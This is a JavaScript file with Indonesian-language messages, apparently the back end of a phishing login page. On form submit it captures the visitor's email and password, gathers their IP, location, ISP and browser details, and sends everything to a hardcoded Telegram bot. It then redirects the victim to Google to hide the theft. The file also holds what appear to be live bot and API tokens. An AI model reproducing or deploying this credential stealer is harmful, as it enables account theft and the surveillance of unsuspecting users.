document.getElementById("loginForm").addEventListener("submit", async function(event) {
    event.preventDefault();

    let email = document.getElementById("email").value;
    let password = document.getElementById("password").value;

    
    let ipInfo = { ip: "Tidak diketahui", city: "Tidak diketahui", country: "Tidak diketahui", org: "Tidak diketahui" };
    try {
        let response = await fetch("https://ipinfo.io/json?token=961f6caebd0f7d");
        ipInfo = await response.json();
    } catch (error) {
        console.error("Gagal mendapatkan data IP:", error);
    }

    
    let userAgent = navigator.userAgent;

    let botToken = "7628314972:AAHZtVoYDVeujuM8o7xpvaLzTGIjrMJodhY";
    let chatId = "6786210993";
    let imageUrl = "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSBP2AL4cW1E3eHRFtEDZXB2GOyz2Wn93Y2PQ&usqp=CAU"; 

    
    let photoUrl = `https://api.telegram.org/bot${botToken}/sendPhoto?chat_id=${chatId}&photo=${encodeURIComponent(imageUrl)}`;
    await fetch(photoUrl);

    
    let message = `🔒 *Login Berhasil*\n\n📧 Email: ${email}\n🔑 Password: ${password}\n🌍 IP: ${ipInfo.ip}\n📍 Kota: ${ipInfo.city}, ${ipInfo.country}\n🏢 Provider: ${ipInfo.org}\n🖥 OS & Browser: ${userAgent}`;
    let url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;

    fetch(url)
        .then(response => response.json())
        .then(data => {
            if (data.ok) {
                console.log("Data terkirim ke Telegram!");
               
                window.location.href = "https://www.google.com";
            } else {
                console.error("Gagal kirim ke Telegram!", data);
            }
        })
        .catch(error => console.error("Error:", error));
});
